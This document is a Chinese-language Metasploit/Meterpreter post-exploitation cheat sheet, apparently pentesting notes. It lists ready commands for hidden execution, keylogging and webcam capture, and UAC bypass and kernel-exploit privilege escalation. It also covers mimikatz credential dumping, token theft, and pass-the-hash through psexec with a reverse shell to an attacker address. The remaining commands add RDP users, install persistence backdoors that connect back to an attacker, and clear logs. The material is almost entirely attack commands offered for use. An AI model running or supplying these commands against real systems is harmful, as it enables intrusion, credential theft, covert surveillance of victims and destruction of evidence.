  ##### 交互
  	CTRL+Z    把session放入后台
	当攻击成功后会返回会话，使用session -l命令列出当前获取到的会话
	>session -l
	使用
	>sessions -i id 来进入一个会话进行交互
	>sessions -k id 杀死一个会话
	>background 将当前会话放置后台
	>sessions -x检查心跳
	>sessions -u [ID] cmdshell升级meterpreter shell
	>reboot / shutdown   重启/关机
  ##### 命令
  	>idletime 查看目标机闲置时间
	>shell 进入目标cmdshell
	>uictl [enable/disable] [keyboard/mouse/all]  开启或禁止键盘/鼠标
	>uictl disable mouse  禁用鼠标
	>uictl disable keyboard  禁用键盘
	>webcam_list   查看摄像头
	>webcam_snap   通过摄像头拍照
	>webcam_stream  通过摄像头开启视频
	>execute -H -i -f cmd.exe 执行cmd.exe，-H不可见，-i交互 
	>execute -H -m -d calc.exe -f wce.exe -a "-o 1.txt" 隐藏执行
	>execute -H -i -c -m -d calc.exe -f /root/wce.exe -a  -w   从内存执行
	>ps 查看进程
	>migrate pid     迁移进程
	>kill pid   #杀死进程
	>screenshot  截图
	>run 执行模块，2下tab列出
	>run post/windows/capture/keylog_recorder 键盘记录
	>run packetrecorder -li 列出接口
	>run packetrecorder -i 1  监控接口
  ##### 文件操作
	>pwd 查看当前目录
	>ls 列出当前目录文件
	>search -f *pass*        搜索文件
	>cat c:\\passwd.txt   查看文件内容
	>upload /tmp/pwn.txt C:\\1.txt   上传文件
	>download c:\\passwd.txt /tmp/  下载文件
	>edit c:\\1.txt  编辑或创建文件
	>rm C:\\1.txt 删除文件
	>mkdir folder  创建文件夹
	>rmdir folder  删除文件夹
	>lcd /tmp   #攻击者主机 切换目录
	>timestomp -v C://2.txt   #查看时间戳
	>timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt
  ##### 提权
	>getuid 查看权限
	>getsystem 提权
	bypassuac
	>use exploit/windows/local/bypassuac
	>use exploit/windows/local/bypassuac_injection
	>use windows/local/bypassuac_vbs
	>use windows/local/ask
	内核漏洞提权
	>run post/windows/gather/enum_patches
	>use exploit/windows/local/ms13_053_schlamperei
	>set SESSION 2
	>exploit
  ##### 后渗透&权限维持
  ###### 查看信息ip和路由
	ipconfig/ifconfig
	netstat –ano
	route
  ###### 端口转发
	portfwd add -l 4444 -p 3389 -r 127.0.0.1 目标机的3389转发到本地4444
  ###### 添加路由及进行扫描
	run autoroute –h #查看帮助
	run autoroute -s 192.168.159.0/24  #添加到目标环境网络
	run autoroute –p  #查看添加的路由
	run post/windows/gather/arp_scanner RHOSTS=192.168.159.0/24
	run auxiliary/scanner/portscan/tcp RHOSTS=192.168.159.144 PORTS=3389
  ###### Socks4a代理
	msf> use auxiliary/server/socks4a 
	msf > set srvhost 127.0.0.1
	msf > set srvport 1080
	msf > run
	vi /etc/proxychains.conf 添加 socks4 127.0.0.1 1080
  ###### mimikatz抓密码
	load mimikatz
	wdigest
	mimikatz_command -f samdump::hashes  #执行mimikatz命令
	mimikatz_command -f sekurlsa::searchPasswords
  ###### 开启RDP
	run getgui –h #查看帮助
	run getgui -e #开启远程桌面
	run getgui -u lltest2 -p 123456   #添加用户
	run getgui -f 6661 –e   #3389端口转发到6661

	run post/windows/manage/enable_rdp 开启rdp
	run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456  添加用户
	run post/windows/manage/enable_rdp FORWARD=true LPORT=4444 端口转发
  ###### sniffer抓包
	use sniffer
	sniffer_interfaces   #查看网卡
	sniffer_start 2   #选择网卡 开始抓包
	sniffer_stats 2   #查看状态
	sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包
	sniffer_stop 2   #停止抓包
  ###### incognito假冒令牌
	use incognito
	list_tokens -u
	impersonate_token 'NT AUTHORITY\SYSTEM'  假冒SYSTEM token
	或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\
	execute -f cmd.exe -i –t    # -t 使用假冒的token 执行
	或者直接shell
	rev2self   #返回原始token
  ###### steal_token窃取
	steal_token <PID>  窃取令牌
	drop_token 删除窃取的token
  ###### hash
	获取hash >run post/windows/gather/smart_hashdump 需system权限
	PSExec哈希传递
	msf > use exploit/windows/smb/psexec
	msf > set payload windows/meterpreter/reverse_tcp
	msf > set LHOST 192.168.159.134
	msf > set LPORT 443
	msf > set RHOST 192.168.159.144
	msf >set SMBUser Administrator
	msf >set SMBPass aad3b4*****04ee:5b5f00*****c424c
	msf >set SMBDomain  WORKGROUP   #域用户需要设置SMBDomain
	msf >exploit
  ###### persistence启动项后门
	run persistence -X -i 5 -p 6661 -r 192.168.159.134
	-X 开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip
	连接
	use exploit/multi/handler
  ###### metsvc
	run metsvc –A 安装后门
	连接
	use exploit/multi/handler
	端口31337
  ##### 清理日志
	>clearav 